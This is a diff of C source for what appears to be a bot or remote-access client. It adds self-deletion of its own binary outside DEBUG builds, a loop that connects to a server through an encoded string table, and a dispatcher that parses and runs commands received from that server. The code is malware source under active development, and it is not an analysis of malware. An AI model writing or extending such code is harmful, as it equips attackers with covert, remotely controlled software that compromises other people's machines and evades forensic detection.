@@ -1,3 +1,5 @@
+// Developed by 333revenge
+
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -13,8 +15,9 @@
 #include "ram_mem.h"
 #include "utils.h"
 #include "receiver.h"
+#include "command.h"
 
-#define RESPONSE_SIZE 4096
+#define RESPONSE_SIZE 12
 
 uint8_t is_connected(int socket_fd)
 {
@@ -39,16 +42,20 @@ uint8_t is_connected(int socket_fd)
     return 0;
 }
 
-int main(void)
+int main(int argc, char **argv)
 {
     dict_init();
 
+#ifndef DEBUG
+    unlink(argv[0]);
+#endif
+
     int client_fd;
     struct sockaddr_in server_address;
-    char buffer[RESPONSE_SIZE];
+    uint8_t buffer[RESPONSE_SIZE];
     const char *message = dict_get(DICT_SERVER_HELLO);
-    
-    u_int8_t is_first_cycle = 1;
+
+    uint8_t is_first_cycle = 1;
 
     while (1)
     {
@@ -97,13 +104,20 @@ int main(void)
 #ifdef DEBUG
         if (received > 0)
         {
-            printf("[main] Received from server: %s\n", buffer);
+            printf("[main] Received from server: ");
+            for (int i = 0; i < RESPONSE_SIZE; i++)
+            {
+                printf("%02x ", buffer[i]);
+            }
+            printf("\n");
         }
         else
         {
             printf("[main] No data received\n");
         }
 #endif
+
+        parse_command_from_buffer(buffer);
 
         memset(buffer, 0, sizeof(buffer));
         is_first_cycle = 0;
